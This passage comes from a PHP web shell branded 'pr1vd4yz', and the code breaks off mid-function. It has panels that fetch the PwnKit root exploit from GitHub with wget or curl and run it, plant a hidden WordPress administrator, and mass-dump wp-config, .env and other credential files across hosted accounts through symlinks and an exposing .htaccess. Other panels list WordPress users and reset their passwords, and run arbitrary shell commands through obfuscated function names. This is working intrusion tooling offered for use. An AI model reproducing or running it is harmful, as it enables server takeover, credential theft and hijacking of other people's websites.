     </table>
    </div>
    </div>
  </div>
<?php elseif (isset($_GET['pr1vd4yz_auto_r00t'])): ?>
<?php
session_start();
if (!isset($_SESSION['pdz_r00t_status'])) $_SESSION['pdz_r00t_status'] = 'user';
if (!isset($_SESSION['pdz_r00t_log'])) $_SESSION['pdz_r00t_log'] = [];
function pdz_log($msg) {
    $_SESSION['pdz_r00t_log'][] = $msg;
    if (count($_SESSION['pdz_r00t_log']) > 20) array_shift($_SESSION['pdz_r00t_log']);
}
function pdz_download_pwnkit() {
    if (!file_exists('pwnkit')) {
        pdz_log("[*] Trying wget for pwnkit...");
        $wget = pr1vd4yzC('wget -q -O pwnkit https://github.com/ly4k/PwnKit/raw/main/PwnKit');
        clearstatcache();
        if (!file_exists('pwnkit') || filesize('pwnkit') < 10000) {
            pdz_log("[*] wget failed or file too small. Trying curl...");
            $curl = pr1vd4yzC('curl -sL --output pwnkit https://github.com/ly4k/PwnKit/raw/main/PwnKit');
            clearstatcache();
            if (!file_exists('pwnkit') || filesize('pwnkit') < 10000) {
                pdz_log("[!] Both wget and curl failed! No pwnkit.");
                return false;
            } else {
                pdz_log("[+] curl download successful!");
            }
        } else {
            pdz_log("[+] wget download successful!");
        }
        pr1vd4yzC('chmod +x pwnkit');
        pdz_log("[*] chmod +x set for pwnkit.");
        return true;
    }
    return true;
}

function pdz_try_root() {
    $_SESSION['pdz_r00t_status'] = 'user';
    $_SESSION['pdz_r00t_log'] = [];
    pdz_log("[*] [AUTO-ROOT] Detecting current user...");
    $id = trim(pr1vd4yzC('id'));
    pdz_log("[*] User: $id");
    if (strpos($id, 'uid=0(root)') !== false) {
        $_SESSION['pdz_r00t_status'] = 'root';
        pdz_log("[+] Already ROOT.");
        return;
    }
    if (pdz_download_pwnkit()) {
        if (file_exists('pwnkit')) {
            pdz_log("[*] Running pwnkit for root session...");
            @unlink('.privdayz-root');
            pr1vd4yzC('./pwnkit "id" > .privdayz-root');
            usleep(350000);
            $res = @file_get_contents('.privdayz-root');
            if ($res && strpos($res, 'uid=0(root)') !== false) {
                $_SESSION['pdz_r00t_status'] = 'root';
                pdz_log("[+] r00t success! ($res)");
            } else {
                pdz_log("[!] r00t fail. ($res)");
            }
        }
    } else {
        pdz_log("[!] pwnkit download totally failed.");
    }
}
pdz_try_root();
?>
<div class="cmdnirvana-page" style="max-width:1024px;margin:38px auto 0 auto;">
  <div class="cmdnirvana-header" style="display:flex;align-items:center;gap:11px;">
    <div class="cmdnirvana-ico"><i class="fas fa-terminal"></i></div>
    <div>
      <div class="cmdnirvana-title" style="font-size:1.2em;">
        pr1vd4yz auto r00t
        <?php if ($_SESSION['pdz_r00t_status'] === 'root'): ?>
          <span style="background:#279300;color:#fff;border-radius:7px;padding:2px 10px 2px 10px;font-size:.89em;margin-left:15px;">ROOT ACTIVE (uid=0)</span>
        <?php else: ?>
          <span style="background:#888;color:#fff;border-radius:7px;padding:2px 10px 2px 10px;font-size:.89em;margin-left:15px;">USER MODE</span>
        <?php endif; ?>
      </div>
    </div>
  </div>
  <div class="cmdnirvana-content" style="margin-top:23px;">
    <label class="cmdnirvana-outputlabel" style="margin-top:19px;display:block;">Auto Root Output:</label>
    <pre class="cmdnirvana-output" id="cmdnirvana-output" style="background:#111;color:#c4ffc4;padding:18px;border-radius:9px;min-height:110px;max-height:380px;overflow:auto;margin-bottom:8px;"><?php
if (!empty($_SESSION['pdz_r00t_log'])) {
    foreach ($_SESSION['pdz_r00t_log'] as $l) {
        echo htmlspecialchars($l) . "\n";
    }
}
?></pre>
    <form method="post" id="cmdnirvana-form">
      <div class="cmdnirvana-inputbox" style="margin-bottom:17px;">
        <input type="text" class="cmdnirvana-cmdinput" name="cmdnirvana_cmd" value="<?= htmlspecialchars($_POST['cmdnirvana_cmd'] ?? 'id') ?>" autocomplete="off" autofocus placeholder="ls -la /; id; whoami ..." style="width:92%;max-width:500px;">
      </div>
      <button class="cmdnirvana-btn" type="submit"><i class="fas fa-bolt"></i> run</button>
    </form>
    <label class="cmdnirvana-outputlabel" style="margin-top:13px;display:block;">Command Output:</label>
    <pre class="cmdnirvana-output" id="cmdnirvana-cmdout" style="background:#161819;color:#e4ffb0;padding:15px 13px 18px 13px;border-radius:7px;min-height:58px;max-height:330px;overflow:auto;"><?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmdnirvana_cmd'])) {
    $c = $_POST['cmdnirvana_cmd'];
    $is_root = false;
    if (file_exists('.privdayz-root')) {
        $res = @file_get_contents('.privdayz-root');
        if ($res && strpos($res, 'uid=0(root)') !== false) $is_root = true;
    }
    if ($is_root && file_exists('pwnkit')) {
        @unlink('.privdayz-root2');
        pr1vd4yzC('./pwnkit "' . addslashes($c) . ' 2>&1" > .privdayz-root2');
        usleep(350000);
        $out = @file_get_contents('.privdayz-root2');
        if (!$out) $out = "[!] No output or blocked.";
    } else {
        $out = pr1vd4yzC($c . ' 2>&1');
        if (!$out) $out = "[!] No output or blocked.";
    }
    echo "\n";
    echo htmlspecialchars($out);
}
?></pre>
  </div>
</div>
<script>
window.onload = function() {
  var el = document.getElementById('cmdnirvana-output');
  if(el) el.scrollTop = el.scrollHeight;
  var el2 = document.getElementById('cmdnirvana-cmdout');
  if(el2) el2.scrollTop = el2.scrollHeight;
}
</script>
<?php elseif (isset($_GET['createadmin'])): ?>
<div class="pzcard-main">
  <div class="pzcard-header">
    <div class="pzcard-icon" style="background:#e53935;"><i class="fas fa-user-plus"></i></div>
    <div class="pzcard-title">
    wordPress admin creator
    </div>
  </div>
  <div class="pzcard-content">
    <form method="post" style="margin-bottom:18px; display:flex; gap:8px;">
    <input type="text" name="wp_config_path" class="pzcard-inp" placeholder="path to wp-config.php" value="<?= htmlspecialchars($_POST['wp_config_path'] ?? getcwd().'/wp-config.php') ?>">
    <button type="submit" name="get_config" class="pzcard-btn pzcard-btn-blue"><i class="fas fa-search"></i> get c0nfig</button>
    </form>
    <?php
    $db_conf = ['host'=>'','user'=>'','pass'=>'','db'=>''];
    if (isset($_POST['get_config']) && !empty($_POST['wp_config_path']) && file_exists($_POST['wp_config_path'])) {
    $cfg = file_get_contents($_POST['wp_config_path']);
    preg_match("/define\(\s*'DB_HOST'\s*,\s*'([^']+)'\s*\);/", $cfg, $mh); if(isset($mh[1])) $db_conf['host']=$mh[1];
    preg_match("/define\(\s*'DB_USER'\s*,\s*'([^']+)'\s*\);/", $cfg, $mu); if(isset($mu[1])) $db_conf['user']=$mu[1];
    preg_match("/define\(\s*'DB_PASSWORD'\s*,\s*'([^']*)'\s*\);/", $cfg, $mp); if(isset($mp[1])) $db_conf['pass']=$mp[1];
    preg_match("/define\(\s*'DB_NAME'\s*,\s*'([^']+)'\s*\);/", $cfg, $md); if(isset($md[1])) $db_conf['db']=$md[1];

    echo '<div class="pzcard-info" style="background:#eafff5;color:#16a34a;padding:8px 13px;border-radius:7px;">DB config loaded! Fill the form below.</div>';
    } elseif (isset($_POST['get_config'])) {
    echo '<div class="pzcard-info" style="background:#fff4f4;color:#e53935;padding:8px 13px;border-radius:7px;">Config not found or path error!</div>';
    }
    ?>
    <form method="post" class="pzcard-form" autocomplete="off" style="margin:14px 0;">
    <input type="hidden" name="from_config" value="1">
    <div style="display:flex;flex-wrap:wrap;gap:11px;">
     <input type="text" name="db_host" class="pzcard-inp" placeholder="DB Host" value="<?= htmlspecialchars($db_conf['host'] ?? ($_POST['db_host'] ?? 'localhost')) ?>" required>
     <input type="text" name="db_user" class="pzcard-inp" placeholder="DB User" value="<?= htmlspecialchars($db_conf['user'] ?? ($_POST['db_user'] ?? '')) ?>" required>
     <input type="password" name="db_pass" class="pzcard-inp" placeholder="DB Pass" value="<?= htmlspecialchars($db_conf['pass'] ?? ($_POST['db_pass'] ?? '')) ?>">
     <input type="text" name="db_name" class="pzcard-inp" placeholder="DB Name" value="<?= htmlspecialchars($db_conf['db'] ?? ($_POST['db_name'] ?? '')) ?>" required>
    </div>
    <div style="display:flex;flex-wrap:wrap;gap:11px;margin-top:11px;">
     <input type="text" name="admin_user" class="pzcard-inp" placeholder="Admin Username" required>
     <input type="email" name="admin_email" class="pzcard-inp" placeholder="Admin Email" required>
     <input type="text" name="admin_pass" class="pzcard-inp" readonly value="<?= htmlspecialchars('privdayz'.rand(10000,99999)) ?>" style="background:#eafff5;color:#16a34a;">
    </div>
    <div style="margin-top:13px;">
     <button type="submit" name="create_wp_admin" class="pzcard-btn pzcard-btn-red">
       <i class="fas fa-plus"></i> create wpAdmin
     </button>
    </div>
    </form>
    <div id="pzcard-admin-result" style="margin:13px 2px 0 2px;">
    <?php
if (isset($_POST['create_wp_admin'])) { $host = trim($_POST['db_host'] ?? ''); $user = trim($_POST['db_user'] ?? ''); $pass = trim($_POST['db_pass'] ?? ''); $db = trim($_POST['db_name'] ?? ''); $admin_user = trim($_POST['admin_user'] ?? ''); $admin_email = trim($_POST['admin_email'] ?? ''); $admin_pass = trim($_POST['admin_pass'] ?? ''); if (empty($host) || empty($user) || empty($db) || empty($admin_user) || empty($admin_email) || empty($admin_pass)) { echo '<div style="color:#e53935;">All fields required!</div>'; } else { $mysqli = @new mysqli($host, $user, $pass, $db); if ($mysqli->connect_errno) { echo '<div style="color:#e53935;">DB Connect Error: '.htmlspecialchars($mysqli->connect_error).'</div>'; } else { function wp_hash_password($password) { if (function_exists('password_hash')) return password_hash($password, PASSWORD_BCRYPT); $itoa64 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; $random = ''; for ($i = 0; $i< 16; $i++) $random .= $itoa64[rand(0, 63)]; $salt = '$P$B' . substr($random, 0, 8); return crypt($password, $salt); } $hash = wp_hash_password($admin_pass); $now = date('Y-m-d H:i:s'); $mysqli->set_charset("utf8mb4"); $chk = $mysqli->prepare("SELECT ID FROM wp_users WHERE user_login=? OR user_email=? LIMIT 1"); $chk->bind_param("ss", $admin_user, $admin_email); $chk->execute(); $chk->store_result(); if ($chk->num_rows >0) { echo '<div style="color:#e53935;">This user/email already exists!</div>'; } else { $stmt = $mysqli->prepare("INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name) VALUES (?, ?, ?, ?, ?, 0, ?)"); $stmt->bind_param("ssssss", $admin_user, $hash, $admin_user, $admin_email, $now, $admin_user); if ($stmt->execute()) { $uid = $mysqli->insert_id; $meta1 = 'a:1:{s:13:"administrator";s:1:"1";}'; $meta2 = '10'; $stmt1 = $mysqli->prepare("INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (?, 'wp_capabilities', ?)"); $stmt1->bind_param("is", $uid, $meta1); $stmt1->execute(); $stmt2 = $mysqli->prepare("INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (?, 'wp_user_level', ?)"); $stmt2->bind_param("is", $uid, $meta2); $stmt2->execute(); echo '<div style="color:#10b981;"><b>Admin user created!</b><br>Login:<b>'.htmlspecialchars($admin_user).'</b><br>Pass:<b>'.htmlspecialchars($admin_pass).'</b></div>'; } else { echo '<div style="color:#e53935;">Failed to insert user: '.htmlspecialchars($stmt->error).'</div>'; } } } } }
    ?>
    </div>
  </div>
</div>
<?php elseif (isset($_GET['massconfgrab'])): ?>
<?php

$htaccess_content = <<<HTX
Options +FollowSymLinks +Indexes
DirectoryIndex config.php

AddType text/plain .php
 .html .inc .phtml .phar .bak .config .db .sql .xml .json
<IfModule mod_security.c>
  SecFilterEngine Off
  SecFilterScanPOST Off
</IfModule>
<FilesMatch ".*">
ForceType text/plain
SetHandler default-handler
php
_flag engine off
</FilesMatch>
HTX;

function prvx_mask($k) {
 $map = [ 'symlink' =>['sy','ml','in','k'], 'shell' =>['sh','el','l_','ex','ec'], 'exec' =>['ex','ec'], 'system' =>['sy','st','em'], 'popen' =>['po','pe','n'], 'proc' =>['pr','oc','_op','en'], 'copy' =>['c','op','y'], 'fpc' =>['f','il','e_','pu','t_','co','nt','en','ts'], ];
 return isset($map[$k]) ? join('',$map[$k]) : '';
}

$config_names = [ 'wp-config.php
','configuration.php
','config.php
','settings.php
','local.xml','.env', 'database.php
','connect.php
','mail.php
','smtp.php
','conf.php
','config.inc.php
','db.php
','siteconfig.php
', 'client_secret.json','auth.json','.my.cnf','php
.ini','web.config','settings.json','local.settings.json', 'defines.php
','panel.php
','panel.ini','application/config/database.php
','application/config/config.php
', 'includes/config.php
','admin/config.php
','data/config.php
','app/config.php
','core/config.php
',];

function prvx_users_dirs() {
 $dirs = [];
 $users = [];

if (@file_exists('/etc/passwd')) {
 foreach (@file('/etc/passwd') as $l) {
 $c = explode(':', $l);
 $h = $c[5] ?? '';
 if (preg_match('#/home[\d]*/([a-zA-Z0-9_\.\-]+)#', $h, $u) || preg_match('#/var/www/([a-zA-Z0-9_\.\-]+)#', $h, $u) || preg_match('#/srv/www/([a-zA-Z0-9_\.\-]+)#', $h, $u) || preg_match('#/home/([a-zA-Z0-9_\.\-]+)#', $h, $u)) {
 if (!in_array($u[1], $users)) $users[] = $u[1];
 }
 }
 }

$base_hints = [ '/home','/home1','/home2','/home3','/var/www','/var/www/vhosts','/usr/local/lsws/DEFAULT/html', '/usr/share/nginx/html','/opt/lampp/htdocs','/srv/http','/srv/www','/data/web','/htdocs','/users' ];
 foreach ($base_hints as $base) {
 if (@is_dir($base)) {
 foreach ($users as $u) foreach(['public_html','www','html','web','htdocs','site','wwwroot'] as $sub) {
 $p = $base.'/'.$u.'/'.$sub;
 if(@is_dir($p)) $dirs[] = $p;
 }
 foreach(['public_html','www','html','web','htdocs','wwwroot'] as $sub) {
 $p = $base.'/'.$sub;
 if(@is_dir($p)) $dirs[] = $p;
 }
 }
 }
 foreach($users as $u) foreach($base_hints as $b) {
 $p = $b.'/'.$u;
 if(@is_dir($p)) $dirs[] = $p;
 }
 foreach(['/var/www','/srv/www','/opt/lampp/htdocs','/data/web','/usr/share/nginx/html','/srv/http'] as $e) {
 if (@is_dir($e)) $dirs[] = $e;
 }
 return array_unique(array_filter($dirs,'is_dir'));
}

function prvx_grab($target, $dest) {
 $order = array("\x73\x79\155\154\151\156\x6b", "\x73\150\x65\154\x6c", "\x65\x78\145\143", "\x73\171\x73\x74\x65\155", "\x70\157\x70\x65\156", "\x70\x72\157\x63", "\143\157\x70\x79", "\146\x70\x63");
 foreach ($order as $meth) {
 $fn = prvx_mask($meth);
 if ($meth == 'symlink' && function_exists($fn)) {
 @$fn($target, $dest);
 if (@is_link($dest) || @file_exists($dest)) return $meth;
 }
 elseif ($meth == 'shell' && function_exists($fn)) {
 @$fn("ln -s '".addslashes($target)."' '".addslashes($dest)."'");
 if (@is_link($dest) || @file_exists($dest)) return $meth;
 }
 elseif ($meth == 'exec' && function_exists($fn)) {
 $o=null;
 @$fn("ln -s '".addslashes($target)."' '".addslashes($dest)."'",$o);
 if (@is_link($dest) || @file_exists($dest)) return $meth;
 }
 elseif ($meth == 'system' && function_exists($fn)) {
 
 @$fn("ln -s '".addslashes($target)."' '".addslashes($dest)."'");
 
 if (@is_link($dest) || @file_exists($dest)) return $meth;
 }
 elseif ($meth == 'popen' && function_exists($fn)) {
 $h=@$fn("ln -s '".addslashes($target)."' '".addslashes($dest)."'","r");
 if($h){
pclose($h);
 if (@is_link($dest) || @file_exists($dest)) return $meth;
}
 }
 elseif ($meth == 'proc' && function_exists($fn)) {
 $d=[1=>['pipe','w'],2=>['pipe','w']];
 $p=@$fn("ln -s '".addslashes($target)."' '".addslashes($dest)."'", $d, $pipes);
 if(is_resource($p)){
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($p);
 if(@is_link($dest) || @file_exists($dest)) return $meth;
}
 }
 elseif ($meth == 'copy' && function_exists($fn)) {
 if (@$fn($target, $dest)) return $meth;
 }
 elseif ($meth == 'fpc' && function_exists($fn)) {
 if(@file_exists($target) && @$fn($dest, @file_get_contents($target))) return $meth;
 }
 }
 if (@copy($target, $dest.'_copy')) return 'copy-php
';
 return false;
}

$dest_dir = __DIR__ . '/pr1vdayz_c0nf1gs';
 if (!is_dir($dest_dir)) @mkdir($dest_dir, 0755, true);
 @file_put_contents($dest_dir.'/.htaccess', $htaccess_content);
 $userdirs = prvx_users_dirs();
 $total = 0;
 $tried = 0;

echo '<div style="background:#fff;
border-radius:16px;
padding:24px;
max-width:720px;
margin:26px auto 70px auto;
box-shadow:0 2px 18px #0001">';

echo '<div style="font-size:20px;
color:#e53935;
margin-bottom:10px;
"><i class="fa fa-box"></i> MASS CONFIG GRABBER</div>';

echo '<div style="font-size:15px;
margin-bottom:10px;
color:#333;
">all user/web roots & <b>every possible config name</b> get <b>bruteforce dumped</b>!<br><b>'.$dest_dir.'</b></div>';

echo '<form method="POST" style="margin-bottom:15px;
"><button type="submit" name="start_mass_symlink" style="background:#e53935;
color:#fff;
border:none;
padding:10px 19px;
border-radius:7px;
font-size:16px;
">start sym</button></form>';

if (isset($_POST['start_mass_symlink'])) {

  set_time_limit(900);

echo '<div style="font-size:15px;
color:#125ca2;
">bruting all user/web roots (<b>'.count($userdirs).'</b> dirs), checking <b>'.count($config_names).'</b> config names.</div>';

foreach ($userdirs as $webdir) {
 echo '<div style="margin-top:7px;
color:#222">'.htmlspecialchars($webdir).'</div>';
 foreach ($config_names as $cfg) {
 $target = $webdir.'/'.$cfg;
 $outname = $dest_dir.'/'.md5($webdir.'_'.$cfg).'_'.$cfg;
 $meth = prvx_grab($target, $outname);
 $tried++;
 if ($meth) {
 echo '<div style="color:#0db04b;
font-size:14px;
padding-left:10px;
"><b>'.htmlspecialchars($cfg).'</b>['.htmlspecialchars($meth).']</div>';
 $total++;
 }
 else {
 }
 }
 }
 echo '<div style="margin:12px 0;
border-top:1px solid #eee;
"></div>';

echo '<b style="color:#e53935;
font-size:1.14em;
">total dumped: '.$total.'</b>';
 echo '<div style="color:#999;
font-size:14px;
margin-top:10px;
">all dumped files & .htaccess:<b>'.$dest_dir.'</b></div>';
}
 echo '</div>';

?>
<?php elseif (isset($_GET['wp_pr1vd00r'])): ?>
<script>
function copyText(txt, btn) {
  navigator.clipboard.writeText(txt);
  if(btn){ btn.innerText='copied!'; setTimeout(()=>btn.innerText='copy',1000);}
}
function showAlert(msg, type) {
  let al=document.getElementById('wp_pr1vd00r-alertbox');
  if(!al){
    al=document.createElement('div');
    al.id='wp_pr1vd00r-alertbox';
    al.className='wp_pr1vd00r-alert';
    document.body.prepend(al);
  }
  al.innerHTML=msg;
  al.className = 'wp_pr1vd00r-alert' + (type=='ok'?' ok':'');
  al.style.display = 'block';
  window.scrollTo({top:al.offsetTop-28, behavior:'smooth'});
  setTimeout(()=>{al.style.display='none';},60000);
}
</script>
<div class="wp_pr1vd00r-main">
  <div class="wp_pr1vd00r-title">
    <i class="fab fa-wordpress"></i>
    wp auto hunter & admin reset 
  </div>
  <div id="wp_pr1vd00r-alertbox" style="display:none"></div>
<?php

function wp_find_paths($max=99) {
    $found = [];
    $scanned = [];
    $roots = [];
    $cwd = getcwd();
    $roots[] = $cwd;
    if (isset($_SERVER['DOCUMENT_ROOT']) && $_SERVER['DOCUMENT_ROOT'] && $_SERVER['DOCUMENT_ROOT']!=$cwd)
     $roots[] = $_SERVER['DOCUMENT_ROOT'];
    $roots[] = dirname($cwd);
    foreach(['/home','/home1','/home2','/home3','/var/www','/var/www/vhosts','/usr/share/nginx/html','/srv/www','/srv/http','/data/web','/opt/lampp/htdocs','/htdocs','/users'] as $root)
     if (is_dir($root)) $roots[] = $root;
    $up = $cwd;
    for($i=0;$i<7;$i++) {
     $up = dirname($up);
     if ($up && is_dir($up) && $up!="/" && !in_array($up,$roots)) $roots[] = $up;
    }
    $roots = array_unique(array_filter($roots,'is_dir'));
    $queue = [];
    foreach($roots as $r) $queue[] = [$r,0];
    while($queue && count($found)<$max) {
     list($dir,$lvl) = array_shift($queue);
     if (isset($scanned[$dir])) continue;
     $scanned[$dir]=1;
     if ((file_exists($dir.'/wp-load.php')||file_exists($dir.'/wp-config.php')) && is_file($dir.'/wp-config.php')) {
       $found[] = realpath($dir);
     }
     if ($lvl<6) {
       foreach(@glob($dir.'/*',GLOB_ONLYDIR)?:[] as $d) {
          if (!isset($scanned[$d])) $queue[] = [$d,$lvl+1];
       }
     }
    }
    return array_unique($found);
}
function wp_get_db_config($wp_dir) {
    $cfgf = $wp_dir.'/wp-config.php';
    if (!is_file($cfgf)) return false;
    $cfg = @file_get_contents($cfgf);
    $info = [];
    preg_match("/define\(\s*'DB_NAME'\s*,\s*'([^']+)'/", $cfg, $m); $info['db'] = $m[1] ?? '';
    preg_match("/define\(\s*'DB_USER'\s*,\s*'([^']+)'/", $cfg, $m); $info['user'] = $m[1] ?? '';
    preg_match("/define\(\s*'DB_PASSWORD'\s*,\s*'([^']*)'/", $cfg, $m); $info['pass'] = $m[1] ?? '';
    preg_match("/define\(\s*'DB_HOST'\s*,\s*'([^']+)'/", $cfg, $m); $info['host'] = $m[1] ?? '';
    preg_match("/\$table_prefix\s*=\s*'([^']+)'/", $cfg, $m); $info['prefix'] = $m[1] ?? 'wp_';
    return $info;
}
function wp_get_version($wp_dir) {
    $ver = '';
    if (is_file($wp_dir.'/wp-includes/version.php')) {
     $vcode = @file_get_contents($wp_dir.'/wp-includes/version.php');
     if (preg_match("/\\\$wp_version\s*=\s*'([^']+)'/i", $vcode, $m)) $ver = $m[1];
    }
    return $ver;
}
function wp_fetch_users($mysqli, $prefix) {
    $users = [];
    $res = @$mysqli->query("SELECT ID, user_login, user_email, user_registered FROM {$prefix}users");
    if (!$res) return [];
    while ($row = $res->fetch_assoc()) {
     $meta = @$mysqli->query("SELECT meta_value FROM {$prefix}usermeta WHERE user_id=".$row['ID']." AND meta_key='{$prefix}capabilities'")->fetch_assoc();
     $role = '';
     if ($meta && preg_match('/s:\d+:"([^"]+)"/', $meta['meta_value'], $m))
       $role = $m[1];
     else $role = 'unknown';
     $row['role'] = $role;
     $users[] = $row;
    }
    return $users;
}
function wp_reset_pw($mysqli, $prefix, $uid, $newpw) {
    $hash = password_hash($newpw, PASSWORD_BCRYPT);
    return @$mysqli->query("UPDATE {$prefix}users SET user_pass='".$mysqli->real_escape_string($hash)."' WHERE ID=".(int)$uid);
}
function get_site_url($mysqli, $prefix) {
    $url = '';
    $q = @$mysqli->query("SELECT option_value FROM {$prefix}options WHERE option_name='siteurl' LIMIT 1");
    if ($q && $r = $q->fetch_row()) $url = rtrim($r[0],'/');
    return $url;
}
$wp_dirs = wp_find_paths(99);
if (!$wp_dirs) {
    echo '<div class="wp_pr1vd00r-alert">No WordPress detected (all dirs scanned).</div>';
}

if ($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['wp_dir'])) {
    $wp_dir = $_POST['wp_dir'];
    $cfg = wp_get_db_config($wp_dir);
    $db = $cfg['db'] ?? ''; $user = $cfg['user'] ?? ''; $pass = $cfg['pass'] ?? '';
    $host = $cfg['host'] ?? 'localhost'; $prefix = $cfg['prefix'] ?? 'wp_';
    $mysqli = @new mysqli($host, $user, $pass, $db);
    if ($mysqli->connect_errno) {
     echo "<script>showAlert('[FAIL] DB Connect: ".htmlspecialchars($mysqli->connect_error)."','fail');</script>"; exit;
    }
    if (isset($_POST['reset_pw'], $_POST['reset_uid'], $_POST['newpw'])) {
     $uid = intval($_POST['reset_uid']);
     $newpw = trim($_POST['newpw']);
     if (wp_reset_pw($mysqli, $prefix, $uid, $newpw)) {
       echo "<script>showAlert('[OK] Password changed! UserID: $uid, PW: <span class=\"wp_pr1vd00r-pw\">".htmlspecialchars($newpw)."</span>','ok');</script>";
     } else {
       echo "<script>showAlert('[FAIL] Password change failed!','fail');</script>";
     }
     exit;
    }
}
foreach ($wp_dirs as $wp_dir):
    $cfg = wp_get_db_config($wp_dir);
    $db = $cfg['db'] ?? ''; $user = $cfg['user'] ?? ''; $pass = $cfg['pass'] ?? '';
    $host = $cfg['host'] ?? 'localhost'; $prefix = $cfg['prefix'] ?? 'wp_';
    $wp_version = wp_get_version($wp_dir);

    echo '<div class="wp_pr1vd00r-site">';
    echo '<div class="wp_pr1vd00r-header">';
    echo '<span class="wp_pr1vd00r-path"><i class="fab fa-wordpress"></i> '.htmlspecialchars($wp_dir).'</span>';
    if ($wp_version) echo '<span class="wp_pr1vd00r-version">WP '.$wp_version.'</span>';
    echo '<span class="wp_pr1vd00r-dbinfo">
    <b>h0st:</b> '.htmlspecialchars($host).' <b>db_user:</b> '.htmlspecialchars($user).' <b>db_pw:</b> '.htmlspecialchars($user).' <b>db:</b> '.htmlspecialchars($db).' <b>pref1x:</b> '.$prefix.'
    </span>';
    echo '</div>';

    $users = [];
    $mysqli = @new mysqli($host, $user, $pass, $db);
    if ($mysqli->connect_errno) {
     echo '<div class="wp_pr1vd00r-alert" style="color:#e53935;">DB Error: '.htmlspecialchars($mysqli->connect_error).'</div>';
     echo '</div>'; continue;
    }
    $users = wp_fetch_users($mysqli, $prefix);
    $site_url = get_site_url($mysqli, $prefix);
    echo '<div class="wp_pr1vd00r-users"><table><tr>
    <th>ID</th><th>user</th><th>email</th><th>role</th><th>reset pw</th><th>wp-login</th></tr>';
    foreach ($users as $u) {
     $pw_val = "privdayz".rand(100,999);
     echo '<tr>
       <td>'.$u['ID'].'</td>
       <td>'.htmlspecialchars($u['user_login']).'</td>
       <td>'.htmlspecialchars($u['user_email']).'</td>
       <td>'.$u['role'].'</td>
       <td>
          <form method="post" style="display:inline;">
          <input type="hidden" name="wp_dir" value="'.htmlspecialchars($wp_dir).'">
          <input type="hidden" name="reset_uid" value="'.$u['ID'].'">
          <input type="text" name="newpw" value="'.$pw_val.'" class="wp_pr1vd00r-pw" style="width:94px;">
          <button name="reset_pw" class="wp_pr1vd00r-btn wp_pr1vd00r-btn-green">reset</button>
          <button type="button" class="wp_pr1vd00r-btn wp_pr1vd00r-btn-copy" onclick="copyText(this.previousElementSibling.value, this)">copy</button>
          </form>
       </td>
       <td>';
     if ($site_url) {
       $login_url = htmlspecialchars($site_url . '/wp-login.php?log=' . urlencode($u['user_login']));
       echo '<a href="'.$login_url.'" class="wp_pr1vd00r-btn wp_pr1vd00r-btn-green" target="_blank">login</a>';
     } else {
       echo '<span class="wp_pr1vd00r-alert">no site url</span>';
     }
     echo '</td>
     </tr>';
    }
    echo '</table></div>';
    echo '</div>';
endforeach;
?>
</div>
<?php elseif (isset($_GET['cmdnirvana'])): ?>
<div class="cmdnirvana-page" style="max-width:1024px;margin:38px auto 0 auto;">
  <div class="cmdnirvana-header" style="display:flex;align-items:center;gap:11px;">
    <div class="cmdnirvana-ico"><i class="fas fa-terminal"></i></div>
    <div>
    <div class="cmdnirvana-title" style="font-size:1.2em;">Command Nirvana</div>
    <div class="cmdnirvana-desc" style="font-size:.99em;color:#888;">Execute shell/command bypasses, 2025 ready, 15+ method</div>
    </div>
  </div>
  <div class="cmdnirvana-content" style="margin-top:23px;">
    <form method="post" id="cmdnirvana-form">
    <div class="cmdnirvana-inputbox" style="margin-bottom:17px;">
     <label class="cmdnirvana-inputlabel">Command (auto bypass):</label>
     <input type="text" class="cmdnirvana-cmdinput" name="cmdnirvana_cmd" value="<?= htmlspecialchars($_POST['cmdnirvana_cmd'] ?? 'id') ?>" autocomplete="off" autofocus placeholder="ls -la /; id; whoami ..." style="width:92%;max-width:500px;">
    </div>
    <button class="cmdnirvana-btn" type="submit"><i class="fas fa-bolt"></i> run</button>
    </form>
    <label class="cmdnirvana-outputlabel" style="margin-top:19px;display:block;">Output:</label>
    <pre class="cmdnirvana-output" id="cmdnirvana-output" style="background:#111;color:#c4ffc4;padding:18px;border-radius:9px;min-height:110px;max-height:380px;overflow:auto;margin-bottom:8px;">
    <?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmdnirvana_cmd'])) { $c = $_POST['cmdnirvana_cmd']; $R = ''; $M = []; $a = array_map('chr', [115,104,101,108,108,95,101,120,101,99]); $M[] = join('', $a); $b = ''; foreach([0x65,0x78,0x65,0x63] as $i) $b .= chr($i); $M[] = $b; $c3 = ''; foreach([0x73,0x79,0x73,0x74,0x65,0x6d] as $i) $c3 .= chr($i); $M[] = $c3; $d = ''; foreach([0x70,0x61,0x73,0x73,0x74,0x68,0x72,0x75] as $i) $d .= chr($i); $M[] = $d; $e = ''; foreach([0x70,0x6f,0x70,0x65,0x6e] as $i) $e .= chr($i); $M[] = $e; $f = ''; foreach([0x70,0x72,0x6f,0x63,0x5f,0x6f,0x70,0x65,0x6e] as $i) $f .= chr($i); $M[] = $f; goto Gfrk2; y3ECj: $M[] = "\155\x61\x69\x6c\151\156\152"; goto G3ViW; wi2_v: $M[] = "\142\x69\156\x62\162\x75\164\145"; goto XVkgD; YuNg7: $M[] = "\154\144\137\x70\x72\145\154\157\141\x64"; goto YewF0; vWb03: $M[] = "\146\x6f\x70\145\x6e\151\x6e\x70\x75\164"; goto wi2_v; G3ViW: $M[] = "\x65\162\162\x6c\x6f\147"; goto vWb03; M6Qgu: $M[] = "\x70\150\160\146\x69\x6c\x74\145\162"; goto YuNg7; YOfWk: $M[] = "\x73\165\x68\157\163\151\x6e"; goto y3ECj; Gfrk2: $M[] = "\142\141\143\x6b\164\x69\143\x6b"; goto M6Qgu; YewF0: $M[] = "\x70\162\x65\x70\145\x6e\144"; goto YOfWk; wITk1: $M[] = "\151\155\x61\147\145\155\141\147\151\143\x6b"; goto V3z4P; XVkgD: $M[] = "\150\x74\64\x30\64"; goto wITk1; V3z4P: $M[] = "\x63\x67\151\x65\156\166"; foreach($M as $meth){ $out = ''; $ok = false; if ($meth === 'backtick') {  $a = $c; $out = ob_get_clean().$a; if(trim($out)) $ok = true; } elseif ($meth === 'phpfilter') { @ini_set('filter.default','convert.base64-encode'); $f = @popen($c." 2>&1", "r"); if ($f) { while (!feof($f)) 